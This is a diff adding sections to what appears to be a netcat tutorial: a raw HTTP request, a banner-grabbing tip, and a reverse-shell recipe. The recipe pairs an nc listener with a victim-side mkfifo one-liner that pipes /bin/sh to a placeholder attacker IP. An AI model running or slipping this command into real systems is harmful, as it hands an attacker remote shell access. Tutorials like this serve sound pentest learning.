@@ -106,3 +106,28 @@ python3 -c 'print("A"*1000)' | gzip -c | nc -q 0 localhost 1234
 
 ![image](https://github.com/user-attachments/assets/d8cd72e7-b054-4d11-85b2-dac4876e7e1c)
 
+## Making a HTTP request
+```bash
+nc google.com 80
+```
+```
+GET / HTTP/1.1
+Host: google.com
+User-Agent: Netcat
+Accept: */*
+```
+
+## Banner Grabbing
+- Make connection to the respective ports. The response from the server gives the banner
+
+## Creating Reverse shell
+
+**Attacker machine : Listener**
+```bash
+nc -nvlp 4444
+```
+
+**Victim machine**
+```bash
+mkfifo /tmp/f; nc <attacker_IP> 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
+```
